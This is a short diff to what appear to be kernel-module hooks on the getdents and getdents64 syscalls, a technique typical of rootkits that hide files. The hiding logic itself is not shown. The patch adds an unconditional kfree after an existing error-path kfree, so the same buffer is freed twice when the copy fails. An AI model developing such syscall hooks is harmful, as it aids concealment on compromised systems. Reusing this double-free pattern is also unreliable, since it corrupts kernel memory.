@@ -65,7 +65,6 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	}
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
 	if (dirent_ker == NULL){
-		kfree(dirent_ker);
 		return ret;
 	}
 	error = copy_from_user(dirent_ker, dirent, ret);
@@ -95,6 +94,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	if(error){
 		kfree(dirent_ker);
 	}
+	kfree(dirent_ker);
 	return ret;
 }
 
@@ -117,7 +117,6 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 	}
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
 	if (dirent_ker == NULL){
-		kfree(dirent_ker);
 		return ret;
 	}
 	error = copy_from_user(dirent_ker, dirent, ret);
@@ -145,6 +144,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 	if (error){
 		kfree(dirent_ker);
 	}
+	kfree(dirent_ker);
 	return ret;
 }
 
